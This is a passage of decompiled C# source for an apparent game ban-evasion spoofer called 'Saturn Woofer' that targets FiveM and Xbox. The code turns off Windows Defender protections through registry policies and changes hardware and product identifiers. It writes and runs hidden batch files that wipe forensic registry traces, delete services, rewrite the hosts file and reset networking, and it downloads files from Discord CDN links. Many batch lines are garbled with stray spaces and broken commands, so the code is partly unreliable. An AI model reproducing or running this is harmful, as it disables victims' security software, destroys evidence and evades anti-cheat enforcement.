      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", (object) "1", RegistryValueKind.DWord);
      Main.NullSerials();
      try
      {
        if (((Control) this.MethodCB).Text == "FiveM")
        {
          this.DisableMouse();
          try
          {
            Main.HWIDclick();
            string str = Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5);
            RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
            registryKey.SetValue("ProductID", (object) str);
            registryKey.Close();
            Main.InstallDate();
            Main.Disk();
            Main.HWIDclick();
            Main.XBOXclick();
            Main.PCclick();
            Main.Diskclick();
            Main.New();
            Main.SetMachineName(Main.GenerateString(6));
            if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
            {
              System.IO.File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
              System.IO.File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
            }
            if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
            {
              Directory.Delete("C:\\Program Files (x86)\\Blade Group");
              Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
            }
          }
          catch
          {
          }
          string str1 = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
          using (StreamWriter streamWriter = new StreamWriter(str1))
          {
            streamWriter.WriteLine("echo off");
            streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
            streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
            streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc STARCHARMS_SPOOFER");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
            streamWriter.WriteLine(":folderclean");
            streamWriter.WriteLine("call :getDiscordVersion");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("goto :xboxclean");
            streamWriter.WriteLine(": getDiscordVersion");
            streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
            streamWriter.WriteLine("     set 'varLoc =%%a'");
            streamWriter.WriteLine("   goto :d1");
            streamWriter.WriteLine(")");
            streamWriter.WriteLine(":d1");
            streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
            streamWriter.WriteLine("     set 'discordVersion =%%z'");
            streamWriter.WriteLine(")");
            streamWriter.WriteLine("goto :EOF");
            streamWriter.WriteLine(": xboxclean");
            streamWriter.WriteLine(" cls");
            streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
            streamWriter.WriteLine("sc stop XblAuthManager");
            streamWriter.WriteLine("sc stop XblGameSave");
            streamWriter.WriteLine("sc stop XboxNetApiSvc");
            streamWriter.WriteLine("sc stop XboxGipSvc");
            streamWriter.WriteLine("sc delete XblAuthManager");
            streamWriter.WriteLine("sc delete XblGameSave");
            streamWriter.WriteLine("sc delete XboxNetApiSvc");
            streamWriter.WriteLine("sc delete XboxGipSvc");
            streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
            streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
            streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
            streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
            streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
            streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
            streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
            streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
            streamWriter.WriteLine("exit");
            streamWriter.WriteLine("goto :eof");
          }
          Process.Start(str1).WaitForExit();
          System.IO.File.Delete(str1);
          string path1 = "C:\\Program Files\\Win64";
          if (!Directory.Exists(path1))
            Directory.CreateDirectory(path1);
          if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
          {
            Process.Start("C:\\Program Files\\Win64\\net.bat");
          }
          else
          {
            string path2 = "C:\\Program Files\\Win64\\net.bat";
            using (StreamWriter text = System.IO.File.CreateText(path2))
              text.WriteLine("netsh int ip reset");
            Process process = new Process();
            process.StartInfo.FileName = path2;
            this.processlist.Add(process);
            System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
            process.Start();
          }
          string str2 = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
          using (StreamWriter streamWriter = new StreamWriter(str2))
          {
            streamWriter.WriteLine("echo off");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("taskkill /f /im Steam.exe /t");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
            streamWriter.WriteLine("cls");
            streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc LeanV2");
            streamWriter.WriteLine("cls");
          }
          Process.Start(str2).WaitForExit();
          System.IO.File.Delete(str2);
          Main.HWIDclick();
          Main.XBOXclick();
          Main.PCclick();
          Main.Diskclick();
          Main.FiveM();
          Main.New();
          string path3 = "C:\\Program Files\\Win64";
          if (!Directory.Exists(path3))
            Directory.CreateDirectory(path3);
          if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
          {
            Process.Start("C:\\Program Files\\Win64\\net.bat");
            System.IO.File.Delete("C:\\Program Files\\Win64\\net.bat");
          }
          else
          {
            string path4 = "C:\\Program Files\\Win64\\net.bat";
            using (StreamWriter text = System.IO.File.CreateText(path4))
              text.WriteLine("netsh int ip reset");
            Process process = new Process();
            process.StartInfo.FileName = path4;
            this.processlist.Add(process);
            System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
            process.Start();
            Thread.Sleep(500);
            System.IO.File.Delete("C:\\Program Files\\Win64\\net.bat");
          }
          Main.Kernel();
          new Class1().spoofUserMode();
          if (System.IO.File.Exists("C:\\Windows\\System32\\nvml.dll"))
          {
            try
            {
              System.IO.File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
              System.IO.File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
            }
            catch
            {
            }
          }
          string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
          string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
          if (Directory.Exists(folderPath1 + "\\DigitalEntitlements"))
            Directory.Delete(folderPath1 + "\\DigitalEntitlements", true);
          if (Directory.Exists(folderPath1 + "\\D3DSCache"))
            Directory.Delete(folderPath1 + "\\D3DSCache", true);
          if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\crashes"))
            Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\crashes", true);
          if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\logs"))
            Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\logs", true);
          if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\data\\cache"))
            Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\data\\cache", true);
          if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\citizen"))
            Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\citizen", true);
          if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\data"))
            Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\data", true);
          Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\data\\server-cache");
          if (Directory.Exists(folderPath2 + "\\CitizenFX"))
            Directory.Delete(folderPath2 + "\\CitizenFX", true);
          string path5 = "C:\\Program Files\\Win64";
          if (!Directory.Exists(path5))
            Directory.CreateDirectory(path5);
          try
          {
            if (System.IO.File.Exists("C:\\Program Files\\Microsoft\\nodejs.exe"))
              System.IO.File.Delete("C:\\Program Files\\Microsoft\\nodejs.exe");
          }
          catch
          {
          }
          this.EnableMouse();
          int num = (int) MessageBox.Show("FiveM Spoofed!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        else if (((Control) this.MethodCB).Text == "FiveM 1-Click")
        {
          int num1 = (int) MessageBox.Show("FiveM 1-Click is currently testing, releasing soon...", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        else if (((Control) this.MethodCB).Text == "FiveM V2 (BETA)")
        {
          this.Hide();
          if (MessageBox.Show("This method is new and still in BETA, wanna use?", "Saturn Woofer - FiveM V2 (BETA)", MessageBoxButtons.YesNo) == DialogResult.Yes)
          {
            string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (Directory.Exists(folderPath3 + "\\DigitalEntitlements"))
              Directory.Delete(folderPath3 + "\\DigitalEntitlements", true);
            if (Directory.Exists(folderPath3 + "\\FiveM\\FiveM.app\\crashes"))
              Directory.Delete(folderPath3 + "\\FiveM\\FiveM.app\\crashes", true);
            if (Directory.Exists(folderPath3 + "\\FiveM\\FiveM.app\\logs"))
              Directory.Delete(folderPath3 + "\\FiveM\\FiveM.app\\logs", true);
            Directory.Exists(folderPath3 + "\\FiveM\\FiveM.app\\data\\server-cache");
            if (Directory.Exists(folderPath4 + "\\CitizenFX"))
              Directory.Delete(folderPath4 + "\\CitizenFX", true);
            if (Directory.Exists(folderPath3 + "\\DigitalEntitlements"))
            {
              Directory.Delete(folderPath3 + "\\DigitalEntitlements", true);
              Directory.CreateDirectory(folderPath3 + "\\DigitalEntitlements");
              using (WebClient webClient = new WebClient())
              {
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/961712225607893015/1007681520380678236/7a7be1e8_2112004234", folderPath3 + "\\DigitalEntitlements\\7a7be1e8_2112004234");
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/961712225607893015/1007675846267510804/38d8f400-aa8a-4784-a9f0-26a08628577e", folderPath3 + "\\DigitalEntitlements\\38d8f400-aa8a-4784-a9f0-26a08628577e");
              }
            }
            else
            {
              Directory.CreateDirectory(folderPath3 + "\\DigitalEntitlements");
              using (WebClient webClient = new WebClient())
              {
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/961712225607893015/1007681520380678236/7a7be1e8_2112004234", folderPath3 + "\\DigitalEntitlements\\7a7be1e8_2112004234");
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/961712225607893015/1007675846267510804/38d8f400-aa8a-4784-a9f0-26a08628577e", folderPath3 + "\\DigitalEntitlements\\38d8f400-aa8a-4784-a9f0-26a08628577e");
              }
            }
